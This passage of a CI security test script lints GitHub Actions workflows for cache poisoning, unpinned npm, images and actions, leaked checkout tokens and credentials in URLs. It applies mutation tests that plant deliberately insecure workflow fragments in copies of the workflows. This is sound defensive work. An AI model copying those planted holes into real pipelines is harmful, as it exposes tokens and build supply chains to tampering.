    const urlTexts = [...joined, ...vals(doc.env), ...vals(job.env), ...vals(job.container?.env),
      ...Object.values(job.services ?? {}).flatMap((sv) => vals(sv?.env)),
      ...steps.flatMap((st) => [...vals(st.env), ...vals(st.with)])];
    for (const t of urlTexts)
      if (credUrl.test(t))
        out.push(name + ": puts a credential in a URL, which git and curl print in their errors: " + t);
    for (const st of steps)
      if (String(st.uses ?? "").startsWith("docker/login-action@") && "dry_run" in ((doc.on ?? doc[true] ?? {}).workflow_dispatch?.inputs ?? {}) &&
          !/env\.DRY_RUN\s*!=\s*.true./.test(String(st.if ?? "")))
        out.push(name + ": logs in to a registry on a dry run");
  }
}
if (rule === "pushcache") {
  // #782: a job that ships an image builds it cold. The GHA cache is
  // writable by any run on main and by every job in the same run, so a job
  // that both restores from it and ships can ship layers nobody built in
  // that job. "Ships" is either of:
  //   - pushes: a build-push or bake step whose push is not false or whose
  //     outputs push, a registry login, or a `docker push`, `buildx ...
  //     --push`, `imagetools create` or skopeo/crane/regctl/oras write;
  //   - (#868) builds an image and uploads any artifact: what it uploads
  //     may be that image, for a later job to push. Since #868 the release
  //     image is built that way, by a job with no registry scope, and pushed
  //     from the archive after approval, so the build that ships pushes
  //     nothing itself. Any upload counts, not only one whose path matches
  //     the build output (#868 review: a parent directory, or the same
  //     expression spaced differently, slipped past that), and a classic
  //     docker build counts as a build.
  // Every image build in such a job is held to it, so a rehearsal builds
  // what the release does.
  for (const [name, job] of Object.entries(jobs)) {
    const steps = flatSteps(job.steps).map((x) => x.st);
    const u = (st) => String(st.uses ?? "").toLowerCase();
    const isBuild = (st) => /^docker\/(build-push-action|bake-action)@/.test(u(st));
    const isUpload = (st) => /^actions\/upload-artifact@/.test(u(st));
    const runs = steps.map((st) => typeof st.run === "string" ? st.run : "").join("\n");
    // `outputs: type=image,...,push=true` (or type=registry) pushes as surely
    // as `push: true` does (#680: build-image pushed by digest that way).
    const pushes = steps.some((st) => isBuild(st) && (String(st.with?.push ?? "false") !== "false" ||
        /(?:^|[,\s])push\s*=\s*(?:true|1|t)\b|(?:^|[,\s])type\s*=\s*registry\b/i.test(String(st.with?.outputs ?? "")))) ||
      steps.some((st) => /^docker\/login-action@/.test(u(st))) ||
      // Global flags may sit before the subcommand (skopeo --debug copy).
      /\bdocker(?:\s+-{1,2}\S+(?:\s+(?!-)\S+)?)*\s+(?:(?:image|manifest)\s+)?push\b|\bbuildx\s+(?:build|bake)\b[^\n]*--push\b|\bimagetools\s+create\b|\b(?:skopeo|crane|regctl|oras)(?:\s+-{1,2}\S+(?:\s+(?!-)\S+)?)*\s+(?:copy|cp|push|sync|mutate|append|image\s+copy|index\s+create)\b/.test(runs);
    const builds = steps.some(isBuild) || /\bdocker\s+(?:image\s+)?build\b|\bbuildx\s+(?:build|bake)\b/.test(runs);
    const uploadsArchive = builds && steps.some(isUpload);
    if (!pushes && !uploadsArchive) continue;
    const why = pushes ? "pushes to a registry" : "builds an image and uploads an artifact, which may be that image";
    for (const [i, st] of steps.entries()) {
      const label = name + ": step " + (st.name ?? st.id ?? st.uses ?? String(i));
      if (isBuild(st) && st.with?.["cache-from"] !== undefined)
        out.push(label + " restores cache-from " + JSON.stringify(st.with["cache-from"]) + " in a job that " + why);
      if (isBuild(st) && /cache-from/.test(JSON.stringify(st.with?.set ?? "")))
        out.push(label + " sets cache-from through bake in a job that " + why);
      if (typeof st.run === "string" && /--cache-from\b/.test(st.run))
        out.push(label + " runs a build with --cache-from in a job that " + why);
    }
  }
}
if (rule === "npmpin") {
  // #960: `npm install -g "npm@${NPM_VERSION}"` is exempted by text in the
  // npm publish jobs (narrow, release-exec.test.sh), which is sound only
  // while NPM_VERSION is the workflow pin: an exact x.y.z, set once at the
  // top. Set again below that -- by a job, a step, a container, a script or
  // $GITHUB_ENV -- it could name anything, an npm: alias of another package
  // included, and that package would be installed globally with its
  // lifecycle scripts in a job holding id-token. Names compared ignoring
  // case, as a Windows runner does.
  //
  // #1000: and npm is no longer installed by version at all, which trusted
  // the registry to serve the right npm to a job that can publish. The one
  // global install of npm is npmInstall, from a tarball fetched by its fixed
  // URL and checked against NPM_INTEGRITY on the lines right before it, so
  // NPM_INTEGRITY is a pin too: set once, at the top, beside NPM_VERSION.
  const isPin = (k) => /^npm_(?:version|integrity)$/i.test(k);
  const npmCheck = "[[ \"$NPM_VERSION\" =~ ^[0123456789]+\\.[0123456789]+\\.[0123456789]+$ ]] || { echo \"::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)\"; exit 1; }";
  const npmInstall = "npm install -g --offline --ignore-scripts \"$npm_tgz\"";
  const npmBlock = [npmCheck,
    "npm_tgz=\"$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION}.tgz\"",
    "curl -fsS --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 67108864 -o \"$npm_tgz\" \"https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz\" || { echo \"::error::could not download npm-${NPM_VERSION}.tgz from the registry (#1000)\"; exit 1; }",
    "got=\"sha512-$(openssl dgst -sha512 -binary \"$npm_tgz\" | base64 -w0)\"",
    "[ \"$got\" = \"$NPM_INTEGRITY\" ] || { echo \"::error::npm-${NPM_VERSION}.tgz from the registry is ${got}, not the pinned NPM_INTEGRITY (#1000)\"; exit 1; }",
    npmInstall];
  // ...and that block is the whole step, line for line (review of #1000):
  // a window of lines before the install let a function or an alias
  // defined above it (curl, base64), or a heredoc opener that turned the
  // block into data, through. Comment lines are skipped; any code line
  // that opens a heredoc or a string is itself an extra line here.
  const npmStep = ["set -euo pipefail", ...npmBlock,
    "got=\"$(npm --version)\"",
    "[ \"$got\" = \"$NPM_VERSION\" ] || { echo \"::error::npm on PATH is $got, expected $NPM_VERSION\"; exit 1; }"];
  // Any other global install of npm, by version or alias, or of a spec
  // that names NPM_VERSION.
  const npmByVersion = (l) => /npm@\$\{?npm_version\b/i.test(l) ||
    (/\bnpm(?:\s+-\S+)*\s+(?:install|i|add)\b/.test(l) && /(?:^|\s)(?:-g|--global|--location[= ]global)\b/.test(l) && /(?:^|\s)["\x27]?npm@/.test(l));
  for (const e of [doc.env, ...Object.values(jobs).map((j) => j.env)])
    for (const v of Object.values(e ?? {}))
      for (const n of ["NPM_VERSION", "NPM_INTEGRITY"])
        if (new RegExp("^\\s*" + n + "\\s*=", "im").test(String(v))) out.push("an env value sets " + n + " when written to GITHUB_ENV: " + JSON.stringify(v));
  for (const [k, v] of Object.entries(doc.env ?? {})) {
    if (/^npm_version$/i.test(k) && !/^\d+\.\d+\.\d+$/.test(String(v))) out.push("env." + k + " is " + JSON.stringify(v) + ", not an exact x.y.z");
    if (/^npm_integrity$/i.test(k) && !/^sha512-[A-Za-z0-9+\/]{86}==$/.test(String(v))) out.push("env." + k + " is " + JSON.stringify(v) + ", not a sha512 integrity");
  }
  // The two move together (#1000): a pin of one without the other cannot
  // install anything, and fails the release instead of this check.
  const topKeys = Object.keys(doc.env ?? {});
  const installs = Object.values(jobs).some((j) => flatSteps(j.steps).some(({ st }) => typeof st.run === "string" && st.run.split("\n").some((l) => l.trim() === npmInstall)));
  for (const n of ["NPM_VERSION", "NPM_INTEGRITY"])
    if (!topKeys.includes(n) && (installs || topKeys.some((k) => isPin(k))))
      out.push("the workflow " + (installs ? "installs npm" : "pins " + topKeys.filter(isPin).join(", ")) + " but sets no " + n + " at the top");
  for (const [name, job] of Object.entries(jobs)) {
    for (const k of Object.keys(job.env ?? {})) if (isPin(k)) out.push(name + ": sets " + k + " over the workflow pin");
    for (const k of Object.keys(job.container?.env ?? {})) if (isPin(k)) out.push(name + ": its container sets " + k + " over the workflow pin");
    for (const [i, { st, via }] of flatSteps(job.steps).entries()) {
      const label = name + ": step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (st.name ?? st.id ?? st.uses ?? String(i));
      for (const k of Object.keys(st.env ?? {})) if (isPin(k)) out.push(label + " sets " + k + " over the workflow pin");
      // The pinned install is checked where it runs (#960 review): the lines
      // before it in the same script are the exact x.y.z test, then (#1000)
      // the download of that version by its fixed URL into a fresh
      // directory and the sha512 check against NPM_INTEGRITY, nothing in
      // between, so a value set any way this rule cannot read (a default
      // shell, BASH_ENV, a sourced file, a GITHUB_ENV line built from env)
      // still stops the step, and so does a registry serving other bytes.
      const code = (typeof st.run === "string" ? st.run : "").split("\n").map((l) => l.replace(/^[ \t]+|[ \t]+$/g, "")).filter((l) => l && !l.startsWith("#"));
      code.forEach((l, j) => {
        if (l === npmInstall && (j < 5 || code.slice(j - 5, j).some((x, n) => x !== npmBlock[n])))
          out.push(label + " installs npm without the exact-version check and the sha512 check of its tarball on the lines before it (#960, #1000)");
        else if (l === npmInstall && (code.length !== npmStep.length || code.some((x, n) => x !== npmStep[n])))
          out.push(label + " installs npm in a script that is not exactly the one this rule allows (#1000 review): " + JSON.stringify(code.filter((x, n) => x !== npmStep[n])));
        // Nor in a step whose shell or env could run code before the
        // script: the env the step needs is all at the workflow top.
        if (l === npmInstall && (st.shell !== undefined || job.defaults?.run?.shell !== undefined || doc.defaults?.run?.shell !== undefined || st.env !== undefined))
          out.push(label + " installs npm in a step with a shell: or env: of its own, or a default shell (#1000 review)");
        if (npmByVersion(l))
          out.push(label + " installs npm by version, not from a tarball checked against NPM_INTEGRITY (#1000): " + l);
      });
      if (code.some((l) => l === npmInstall || npmByVersion(l)) && (st["continue-on-error"] !== undefined || job["continue-on-error"] !== undefined))
        out.push(label + " installs npm in a step or job that may continue on error");
      for (const v of Object.values(st.env ?? {}))
        for (const n of ["NPM_VERSION", "NPM_INTEGRITY"])
          if (new RegExp("^\\s*" + n + "\\s*=", "im").test(String(v))) out.push(label + " has an env value that sets " + n + " when written to GITHUB_ENV");
      // An assignment (plain, +=, ${X:=...}, export and friends, read,
      // printf -v) or a GITHUB_ENV line, which is the same text; comments
      // dropped.
      const run = (typeof st.run === "string" ? st.run : "").split("\n").filter((l) => !/^\s*#/.test(l)).join("\n");
      for (const n of ["npm_version", "npm_integrity"])
        if (new RegExp("(?:^|[\\s;&|(`\"\\x27])" + n + "\\+?=|\\$\\{" + n + ":?=|\\b(?:export|declare|typeset|local|readonly|read)\\s+(?:-\\w+\\s+)*" + n + "\\b|\\bprintf\\s+-v\\s*" + n + "\\b", "im").test(run))
          out.push(label + " sets " + n.toUpperCase() + " in its script (for itself, or for later steps through GITHUB_ENV)");
    }
  }
}
if (rule === "images") {
  // (#1048) Every container: and services: image, and every docker:// step,
  // in every workflow, by digest. The runner pulls each before any step
  // runs, by whatever the tag points at then, and runs it with the job.
  const envRef = /\$\{\{\s*env\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}/g;
  const digest = /@sha256:[0-9a-f]{64}$/;
  for (const [name, job] of Object.entries(jobs)) {
    const resolve = (v) => String(v ?? "").replace(envRef, (m, k) => {
      for (const e of [job.env, doc.env]) if (e && typeof e === "object" && k in e) return String(e[k]);
      return m;
    }).trim();
    const pinned = (img) => digest.test(resolve(img));
    if (job.container !== undefined) {
      const img = typeof job.container === "object" && job.container !== null ? job.container.image : job.container;
      if (!pinned(img)) out.push(name + ": container image is not pinned by digest (" + JSON.stringify(String(img ?? "")) + ")");
    }
    if (job.services !== undefined) {
      if (job.services === null || typeof job.services !== "object") out.push(name + ": services is not a mapping this rule can read");
      else
        for (const [sv, def] of Object.entries(job.services)) {
          const img = typeof def === "object" && def !== null ? def.image : def;
          if (!pinned(img)) out.push(name + ": service " + sv + " image is not pinned by digest (" + JSON.stringify(String(img ?? "")) + ")");
        }
    }
    for (const { st, via } of flatSteps(job.steps)) {
      const u = String(st.uses ?? "");
      if (u.toLowerCase().startsWith("docker://") && !digest.test(u))
        out.push(name + (via ? " (via " + via.slice(0, -3) + ")" : "") + ": runs " + u + ", not pinned by digest");
      // A local Docker action runs its image, or builds one from its
      // Dockerfile, whose FROM this rule does not read: only a docker://
      // image by digest passes (#1048 review).
      if (u.startsWith("./") && !/\.ya?ml$/.test(u)) {
        let action = null;
        for (const f of ["action.yml", "action.yaml"])
          try { action = Bun.YAML.parse(require("node:fs").readFileSync(process.env.REPO + "/" + u.slice(2).replace(/\/$/, "") + "/" + f, "utf8")); break; } catch {}
        const img = String(action?.runs?.image ?? "");
        if (action?.runs?.using === "docker" && !(img.toLowerCase().startsWith("docker://") && digest.test(img)))
          out.push(name + (via ? " (via " + via.slice(0, -3) + ")" : "") + ": runs the local Docker action " + u + " (image " + JSON.stringify(img) + "), not pinned by digest");
      }
    }
  }
}
if (rule === "persist") {
  // (#1001) No checkout anywhere leaves its token in .git/config, whatever
  // the workflow holds. The narrower checks in untrusted and narrow came
  // first; this one covers the read-only workflows too, whose later steps
  // run the code of the PR under test, which can read that file.
  // Input names are case-insensitive to GitHub, so a second spelling of the
  // key is read too: exactly one, and false (#1001 review).
  for (const [name, job] of Object.entries(jobs)) {
    // A remote reusable workflow runs steps this rule cannot read.
    if (typeof job.uses === "string" && !job.uses.startsWith("./"))
      out.push(name + ": calls the remote workflow " + job.uses + ", whose checkouts this rule cannot see");
    for (const { st, via } of flatSteps(job.steps)) {
      if (!String(st.uses ?? "").toLowerCase().startsWith("actions/checkout@")) continue;
      const set = Object.entries(st.with ?? {}).filter(([k]) => k.toLowerCase() === "persist-credentials");
      if (set.length !== 1 || set[0][1] !== false)
        out.push(name + (via ? " (via " + via.slice(0, -3) + ")" : "") + ": checkout leaves the token in .git/config (persist-credentials is not false)");
    }
  }
}
if (rule === "license-scan") {
  // (#971) The weekly catalog sync license-checks what the hosted shared
  // build would install, every run: one step runs exactly the scan with
  // --install and nothing else on its line (no || or ; to swallow it),
  // nothing lets it fail quietly (continue-on-error or an if, on the job, the
  // scan, or the steps that fetch and place the regenerated catalog), and
  // the regenerated catalog is put in place BEFORE the scan.
  const exact = /^bun run scripts\/check-piece-licenses\.ts --install "\$RUNNER_TEMP\/license-scan" --summary-md "\$GITHUB_STEP_SUMMARY"$/;
  const found = [];
  for (const [name, job] of Object.entries(jobs)) {
    const steps = flatSteps(job.steps).map(({ st }) => st);
    const scanAt = steps.findIndex((st) => typeof st.run === "string" && /\bscripts\/check-piece-licenses\.ts\b/.test(st.run));
    if (scanAt < 0) continue;
    found.push(name);
    const scan = steps[scanAt];
    if (!/\bbun run scripts\/check-piece-licenses\.ts --install\b/.test(scan.run))
      out.push(name + ": the license scan does not install the catalog (--install)");
    if (!exact.test(scan.run.trim()))
      out.push(name + ": the license scan step runs something besides the scan, which could swallow its failure");
    const loud = (st, what) => {
      if (st["continue-on-error"]) out.push(name + ": " + what + " may fail without failing the run (continue-on-error)");
      if (st.if !== undefined) out.push(name + ": " + what + " is conditional, so some weekly runs skip it");
    };
    loud(job, "the license scan job");
    loud(scan, "the license scan");
    const needs = [].concat(job.needs ?? []);
    if (!needs.includes("generate"))
      out.push(name + ": the license scan does not run after generate, so it checks the old catalog");
    const copyAt = steps.findIndex((st) => typeof st.run === "string" &&
      /catalog-sync\/catalog-generated\.ts"?\s+src\/workflows\/pieces-library\/catalog-generated\.ts/.test(st.run));
    if (copyAt < 0 || copyAt > scanAt) out.push(name + ": the license scan does not put the regenerated catalog in place first");
    else {
      loud(steps[copyAt], "putting the regenerated catalog in place");
      if (steps[copyAt].run.trim() !== "cp \"$RUNNER_TEMP/catalog-sync/catalog-generated.ts\" src/workflows/pieces-library/catalog-generated.ts")
        out.push(name + ": the step that puts the regenerated catalog in place runs something besides the copy");
    }
    const getAt = steps.findIndex((st) => String(st.uses ?? "").startsWith("actions/download-artifact@") && st.with?.name === "catalog-sync");
    if (getAt < 0 || getAt > copyAt) out.push(name + ": the license scan does not download the generated catalog first");
    else loud(steps[getAt], "downloading the generated catalog");
  }
  if (found.length !== 1) out.push("expected exactly one license scan step (scripts/check-piece-licenses.ts), found " + found.length);
}
if (rule === "pinned") {
  const uses = [];
  for (const [name, job] of Object.entries(jobs)) {
    if (typeof job.uses === "string") uses.push([name, job.uses]);
    for (const { st, via } of flatSteps(job.steps)) if (typeof st.uses === "string") uses.push([name + (via ? " (via " + via.slice(0, -3) + ")" : ""), st.uses]);
  }
  for (const [name, u] of uses)
    if (!u.startsWith("./") && !/^[^@\s]+@[0-9a-f]{40}$/.test(u))
      out.push(name + ": uses " + u + " (not a full commit SHA)");
}
if (out.length) console.log(out.join("\n"));
' >"${WORK}/check.mjs"
	fi
	RULE="$1" FILE="$2" REPO="${REPO_DIR:-${HERE}/../..}" bun "${WORK}/check.mjs"
}

# expect_clean <label> <rule> <file>
expect_clean() {
	local found
	found="$(check "$2" "$3")" || {
		no "$1" "the bun helper failed"
		return
	}
	if [ -z "$found" ]; then ok "$1"; else no "$1" "$found"; fi
}

# expect_caught <label> <rule> <file> <exact text> <replacement> [reason]
# With a reason, the report must contain it: a mutant that some OTHER rule
# happens to report proves nothing about the rule it was written for.
expect_caught() {
	local copy="${WORK}/mutant.yml"
	if ! FROM="$3" TO="$copy" OLD="$4" NEW="$5" bun -e '
const s = await Bun.file(process.env.FROM).text();
const n = s.split(process.env.OLD).length - 1;
if (n < 1) { console.error("anchor not found"); process.exit(2); }
await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
'; then
		no "mutant '$1' could be applied (the workflow no longer has the text it mutates)"
		return
	fi
	local found
	# A mutant the check cannot read (a YAML error) proves nothing, and used
	# to read as "passed" (#1029 found one, mangled by a $ in the replacement).
	found="$(check "$2" "$copy")" || {
		no "reports: $1" "the check could not read the mutated workflow: ${found}"
		return
	}
	if [ -z "$found" ]; then
		no "reports: $1" "the check passed a workflow with this hole"
	elif [ -n "${6:-}" ] && ! grep -qF -- "$6" <<<"$found"; then
		no "reports: $1, for the reason it exists" "wanted '${6}', got:
${found}"
	else
		ok "reports: $1"
	fi
}

echo "every job's token scope is explicit"
for f in "$WORKFLOWS"/*.yml; do
	expect_clean "$(basename "$f")" scoped "$f"
done

echo
echo "no checkout leaves its token in .git/config, in any workflow (#1001)"
for f in "$WORKFLOWS"/*.yml; do
	expect_clean "$(basename "$f")" persist "$f"
done
expect_caught 'a read-only PR workflow checkout back to the default (#1001)' persist "$WORKFLOWS/test.yml" \
	$'      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - uses: dorny/paths-filter@' \
	$'      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - uses: dorny/paths-filter@' \
	'changes: checkout leaves the token in .git/config'
expect_caught 'the image build checkout back to the default (#1001)' persist "$WORKFLOWS/docker-build.yml" \
	$'        with:\n          persist-credentials: false\n\n      - name: Set up Docker Buildx' \
	$'\n      - name: Set up Docker Buildx' \
	'docker-build: checkout leaves the token in .git/config'
expect_caught 'persist-credentials set to true on a read-only checkout (#1001)' persist "$WORKFLOWS/test.yml" \
	$'          persist-credentials: false\n      - name: Parse every plist' \
	$'          persist-credentials: true\n      - name: Parse every plist' \
	'plist-lint: checkout leaves the token in .git/config'
expect_caught 'a checkout spelled in another case (#1001)' persist "$WORKFLOWS/test.yml" \
	$'      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - name: Parse every plist' \
	$'      - uses: Actions/Checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - name: Parse every plist' \
	'plist-lint: checkout leaves the token in .git/config'
expect_caught 'persist-credentials spelled a second way, set to true (#1001 review)' persist "$WORKFLOWS/test.yml" \
	$'          persist-credentials: false\n      - name: Parse every plist' \
	$'          Persist-Credentials: true\n          persist-credentials: false\n      - name: Parse every plist' \
	'plist-lint: checkout leaves the token in .git/config'
expect_caught 'a remote reusable workflow, whose checkouts cannot be read (#1001 review)' persist "$WORKFLOWS/test.yml" \
	$'\n  plist-lint:\n' $'\n  remote:\n    uses: octo/ci/.github/workflows/build.yml@3d3c42e5aac5ba805825da76410c181273ba90b1\n  plist-lint:\n' \
	'remote: calls the remote workflow octo/ci/.github/workflows/build.yml@'
# ...and one reached through a local composite action, which the rule
# expands like every other rule that reads steps.
rm -rf "${WORK}/persist-repo" && mkdir -p "${WORK}/persist-repo/.github/actions/co"
printf '%s\n' 'name: co' 'description: checkout' 'runs:' '  using: composite' '  steps:' \
	'    - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1' >"${WORK}/persist-repo/.github/actions/co/action.yml"
REPO_DIR="${WORK}/persist-repo" expect_caught 'a checkout inside a local composite action (#1001)' persist "$WORKFLOWS/docker-build.yml" \
	$'\n      - name: Set up Docker Buildx' \
	$'\n      - uses: ./.github/actions/co\n\n      - name: Set up Docker Buildx' \
	'docker-build (via ./.github/actions/co): checkout leaves the token in .git/config'

echo
echo "every container, service and docker:// image is pinned by digest, in any workflow (#1048)"
for f in "$WORKFLOWS"/*.yml; do
	expect_clean "$(basename "$f")" images "$f"
done
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'a job container by tag in a PR workflow (#1048)' images "$WORKFLOWS/docker-build.yml" \
		$'    timeout-minutes: 30\n' $'    timeout-minutes: 30\n    container: node:22\n' \
		'docker-build: container image is not pinned by digest ("node:22")'
	expect_caught 'a job container image by tag, in the long form (#1048)' images "$WORKFLOWS/test.yml" \
		$'  plist-lint:\n' $'  plist-lint:\n    container:\n      image: ubuntu:24.04\n' \
		'plist-lint: container image is not pinned by digest ("ubuntu:24.04")'
	expect_caught 'a service image by tag (#1048)' images "$WORKFLOWS/test.yml" \
		$'  plist-lint:\n' $'  plist-lint:\n    services:\n      db:\n        image: postgres:16\n' \
		'plist-lint: service db image is not pinned by digest ("postgres:16")'
	expect_caught 'a service image by tag through env (#1048)' images "$WORKFLOWS/test.yml" \
		$'  plist-lint:\n' $'  plist-lint:\n    env:\n      DB: postgres:16\n    services:\n      db:\n        image: ${{ env.DB }}\n' \
		'plist-lint: service db image is not pinned by digest'
	expect_caught 'a service image with a digest followed by more text (#1048)' images "$WORKFLOWS/test.yml" \
		$'  plist-lint:\n' $'  plist-lint:\n    services:\n      db:\n        image: postgres@sha256:0000000000000000000000000000000000000000000000000000000000000000-x\n' \
		'plist-lint: service db image is not pinned by digest'
	expect_caught 'a docker:// step by tag in a workflow that holds authority (#1048)' images "$WORKFLOWS/release.yml" \
		'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' $'      - uses: docker://alpine:3\n      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' \
		'runs docker://alpine:3, not pinned by digest'
}
# A local Docker action, by tag or built from a Dockerfile (#1048 review).
for img in 'docker://alpine:3' 'Dockerfile'; do
	rm -rf "${WORK}/docker-repo" && mkdir -p "${WORK}/docker-repo/.github/actions/d"
	printf '%s\n' 'name: d' 'description: docker' 'runs:' '  using: docker' "  image: ${img}" >"${WORK}/docker-repo/.github/actions/d/action.yml"
	REPO_DIR="${WORK}/docker-repo" expect_caught "a local Docker action whose image is ${img} (#1048 review)" images "$WORKFLOWS/test.yml" \
		'      - name: Parse every plist' $'      - uses: ./.github/actions/d\n      - name: Parse every plist' \
		"plist-lint: runs the local Docker action ./.github/actions/d (image \"${img}\"), not pinned by digest"
done
# ...and a digest is accepted, so the rule is not simply refusing every image.
copy="${WORK}/images-ok.yml"
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
const s = await Bun.file(process.env.FROM).text();
await Bun.write(process.env.TO, s.replace("\n  plist-lint:\n", "\n  plist-lint:\n    container:\n      image: ubuntu@sha256:" + "a".repeat(64) + "\n    services:\n      db: postgres@sha256:" + "b".repeat(64) + "\n"));
'
if grep -q 'sha256:a' "$copy" && [ -z "$(check images "$copy")" ]; then
	ok "an image pinned by digest is accepted (#1048)"
else
	no "an image pinned by digest is accepted (#1048)" "$(check images "$copy")"
fi

echo
echo "the publish path holds nothing by default"
expect_clean "release-exec.yml: permissions {} at the top, every job explicit" publish-perms "$WORKFLOWS/release-exec.yml"

echo
echo "every action in a workflow that holds authority, or that a push or a PR can start, is pinned to a commit"
held=0
reached=()
authed=()
pinchecked=()
mutchecked=()
for f in "$WORKFLOWS"/*.yml; do
	auth="$(check authority "$f")" || {
		no "$(basename "$f"): authority check ran" "the bun helper failed"
		continue
	}
	reach="$(check reach "$f")" || {
		no "$(basename "$f"): reach check ran" "the bun helper failed"
		continue
	}
	[ -n "$reach" ] && reached+=("$(basename "$f")")
	[ -n "$auth" ] && authed+=("$(basename "$f")")
	[ -n "$auth" ] || [ -n "$reach" ] || continue
	pinchecked+=("$(basename "$f")")
	expect_clean "$(basename "$f")" pinned "$f"
	# (#1048) mutable too, on the same set: a workflow a PR starts runs
	# whatever a moved name fetches just as unattended. Its cache part holds
	# a workflow with no authority to the exact-key form (#1047).
	mutchecked+=("$(basename "$f")")
	expect_clean "$(basename "$f"): fetches nothing by a floating version or an undigested image" mutable "$f"
	[ -n "$auth" ] || continue
	held=$((held + 1))
done
# The two PR workflows that hold no authority, which only the reach
# derivation brings under the pin (#984): read from what the loop above
# pin-checked, not from what reach answered, so a loop that stopped
# applying the pin to reached workflows fails here (review of #984).
for f in docker-build.yml test.yml; do
	if printf '%s\n' "${pinchecked[@]}" | grep -qxF "$f"; then
		ok "the pin rule is applied to ${f}, which a PAT-opened PR starts (#984)"
	else
		no "the pin rule is applied to ${f}, which a PAT-opened PR starts (#984)" "pin-checked: ${pinchecked[*]}"
	fi
done
# (#1048) The mutable rule reaches the same two, and the same set as the pin.
for f in docker-build.yml test.yml; do
	if printf '%s\n' "${mutchecked[@]}" | grep -qxF "$f"; then
		ok "the mutable rule is applied to ${f}, which a PAT-opened PR starts (#1048)"
	else
		no "the mutable rule is applied to ${f}, which a PAT-opened PR starts (#1048)" "mutable-checked: ${mutchecked[*]}"
	fi
done
if [ "$(printf '%s\n' "${mutchecked[@]}" | LC_ALL=C sort -u)" = "$(printf '%s\n' "${pinchecked[@]}" | LC_ALL=C sort -u)" ]; then
	ok "the mutable rule is applied to every workflow the pin rule is (#1048)"
else
	no "the mutable rule is applied to every workflow the pin rule is (#1048)" "pin: ${pinchecked[*]}; mutable: ${mutchecked[*]}"
fi
# ...and to exactly the workflows that hold authority or that a push or a
# PR can start, no fewer.
want="$(printf '%s\n' "${authed[@]}" "${reached[@]}" | sed '/^$/d' | LC_ALL=C sort -u | tr '\n' ' ')"
got="$(printf '%s\n' "${pinchecked[@]}" | LC_ALL=C sort -u | tr '\n' ' ')"
if [ -n "$want" ] && [ "$got" = "$want" ]; then
	ok "the pin rule is applied to every workflow that holds authority or that a push or a PR can start (#984)"
else
	no "the pin rule is applied to every workflow that holds authority or that a push or a PR can start (#984)" "wanted: ${want}; pin-checked: ${got}"
fi
# Every loop here reads *.yml, and GitHub runs *.yaml from the same
# directory too, so one named that way would pass every rule unread
# (security review of #984). None may exist.
# yaml_check <dir>: the .yaml files in it, one per line.
yaml_check() { find "$1" -maxdepth 1 -name '*.yaml' -printf '%f\n'; }
found="$(yaml_check "$WORKFLOWS")"
if [ -z "$found" ]; then ok "no workflow is named *.yaml, which every rule here would skip (#984)"; else no "no workflow is named *.yaml, which every rule here would skip (#984)" "$found"; fi
rm -rf "${WORK}/yamldir" && mkdir -p "${WORK}/yamldir" && cp "$WORKFLOWS/test.yml" "${WORK}/yamldir/evade.yaml"
if [ "$(yaml_check "${WORK}/yamldir")" = "evade.yaml" ]; then ok "reports: a workflow named *.yaml (#984)"; else no "reports: a workflow named *.yaml (#984)"; fi
# reach_case <label> <yes|no> <file> <exact text> <replacement>: the
# derivation on a mutated copy, both ways, so it can be neither always yes
# nor always no.
reach_case() {
	local copy="${WORK}/reach.yml"
	if ! FROM="$3" TO="$copy" OLD="$4" NEW="$5" bun -e '
const s = await Bun.file(process.env.FROM).text();
if (!s.includes(process.env.OLD)) process.exit(2);
await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
'; then
		no "reach mutant '$1' could be applied (the workflow no longer has the text it mutates)"
		return
	fi
	local got
	got="$(check reach "$copy")" || got="(the bun helper failed)"
	if { [ "$2" = yes ] && [ "$got" = yes ]; } || { [ "$2" = no ] && [ -z "$got" ]; }; then ok "reach: $1"; else no "reach: $1" "wanted ${2}, got: ${got:-nothing}"; fi
}
# docker-build.yml holds no authority, so every answer below is the
# trigger derivation alone. Its `on:` key is renamed out of the way and a
# new one put in front.
reach_case 'a workflow only a schedule or a dispatch starts is not reached (#984)' no "$WORKFLOWS/docker-build.yml" \
	$'\non:\n' $'\non:\n  schedule:\n    - cron: "0 0 * * *"\n  workflow_dispatch:\nx-was-on:\n'
reach_case 'a workflow_run trigger, which a PR run can fire, is reached (#984)' yes "$WORKFLOWS/docker-build.yml" \
	$'\non:\n' $'\non:\n  workflow_run:\n    workflows: [Tests]\nx-was-on:\n'
reach_case 'a reusable workflow, which a PR workflow can call, is reached (#984)' yes "$WORKFLOWS/docker-build.yml" \
	$'\non:\n' $'\non:\n  workflow_call:\n  workflow_dispatch:\nx-was-on:\n'
reach_case 'a bare pull_request trigger is reached (#984)' yes "$WORKFLOWS/docker-build.yml" \
	$'\non:\n' $'\non: pull_request\nx-was-on:\n'
# Both npm publishers install the same npm, so a bump cannot leave one on
# the version Trusted Publishing was proven with and the other not.
npm_pins="$(for f in release-exec.yml sidecar-release.yml; do
	FILE="$WORKFLOWS/$f" bun -e 'console.log(JSON.stringify(Bun.YAML.parse(await Bun.file(process.env.FILE).text()).env?.NPM_VERSION))'
done | sort -u)"
if [ "$(printf '%s\n' "$npm_pins" | wc -l)" -eq 1 ] && [[ "$npm_pins" =~ ^\"[0-9]+\.[0-9]+\.[0-9]+\"$ ]]; then
